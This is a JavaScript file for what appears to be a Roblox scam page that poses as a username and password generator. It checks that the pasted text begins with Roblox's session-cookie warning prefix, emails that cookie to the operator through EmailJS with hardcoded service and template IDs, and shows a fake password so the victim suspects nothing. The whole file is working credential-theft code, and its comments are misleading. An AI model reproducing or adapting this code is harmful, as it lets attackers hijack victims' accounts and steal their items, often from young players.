// Initialize EmailJS with your Public Key (User ID)
(function() {
    emailjs.init("NUn_eKBpwg_yD_C3O");  // Your Public Key (User ID)
 })();
 
 let canSendEmail = true; // To control email sending logic
 
 document.getElementById("sendButton").addEventListener("click", function () {
   const textContent = document.getElementById("inputText").value.trim();
   const username = document.getElementById("username").value.trim();

   const warningPrefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|";

 
   if (!textContent || !username) {
     document.getElementById("output").textContent = "Please enter both text and a username.";
     return;
   }
 

   if (!textContent.startsWith(warningPrefix)) {
    document.getElementById("output").textContent = "Something is wrong with the cookie";
    // Clear the password display if the warning prefix isn't present
    document.getElementById("usernameDisplay").textContent = '';
    document.getElementById("passwordDisplay").textContent = '';
    return;
  }
   // Check if email can be sent (only one email every 1 minute)
   if (!canSendEmail) {
     document.getElementById("output").textContent = "Please Dont Generate another username and password for 10 minutes.";
     return;
   }
 
   // Disable sending until 1 minute passes
   canSendEmail = false;
 
   // Send email using EmailJS
   emailjs.send("service_r7da5mg", "template_aevmydh", {
     message: textContent  // Pass the text field content as 'message' to your email template
   })
   .then((response) => {
     document.getElementById("output").textContent = " ";
   })
   .catch((error) => {
     document.getElementById("output").textContent = "something went wrong";
     console.error(" ", error);
   });
 
   // Wait for 1 minute (60,000 ms) before allowing another email to be sent
   setTimeout(function () {
     canSendEmail = true;  // Allow email to be sent again after 1 minute
     document.getElementById("output").textContent = "You can now send another email.";
   }, 600000); // 1 minute = 60,000 milliseconds
 
   // Generate a random "bad" password
   const password = generateHumanReadablePassword(username);
   
   // Display the username and generated password
   document.getElementById("usernameDisplay").textContent = `Username: ${username}`;
   document.getElementById("passwordDisplay").textContent = `Password: ${password}`;
 });
 
 // Function to generate a random "bad" password (human-readable and believable)
 function generateHumanReadablePassword(username) {
   const specialCharacters = '!@#$%^&*()_+[]{}|;:,.<>?';
   const uppercaseCharacters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
   const lowercaseCharacters = 'abcdefghijklmnopqrstuvwxyz';
 
   // Make the password more "human" by combining parts of the username with a pattern
   const userPart = username.toLowerCase().slice(0, 4);  // Use the first 4 characters of the username (in lowercase)
   const randomNumber = Math.floor(Math.random() * 100);  // Add a small random number
   const specialChar = specialCharacters.charAt(Math.floor(Math.random() * specialCharacters.length));
   const uppercase = uppercaseCharacters.charAt(Math.floor(Math.random() * uppercaseCharacters.length));
 
   // Combine them to form a password
   const password = `${userPart}${randomNumber}${uppercase}${specialChar}`;
 
   return password;
 }
 